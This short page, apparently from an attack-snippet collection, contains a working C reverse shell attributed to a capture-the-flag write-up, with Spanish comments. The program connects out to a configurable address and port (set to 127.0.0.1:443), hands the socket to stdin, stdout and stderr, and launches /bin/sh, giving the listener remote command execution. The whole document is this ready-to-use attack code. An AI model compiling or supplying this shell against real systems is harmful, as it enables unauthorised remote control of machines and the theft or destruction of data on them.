# Simple Reverse Shell



```c
// source code https://blog.techorganic.com/2015/01/04/pegasus-hacking-challenge/

#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <arpa/inet.h>

#define REMOTE_ADDR "127.0.0.1"
#define REMOTE_PORT 443

int main(int argc, char *argv[])
{
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));

    // Redirige la entrada y salida estándar al socket
    dup2(s, 0);  // stdin
    dup2(s, 1);  // stdout
    dup2(s, 2);  // stderr

    // Ejecuta un shell
    execve("/bin/sh", 0, 0);

    return 0;
}
```
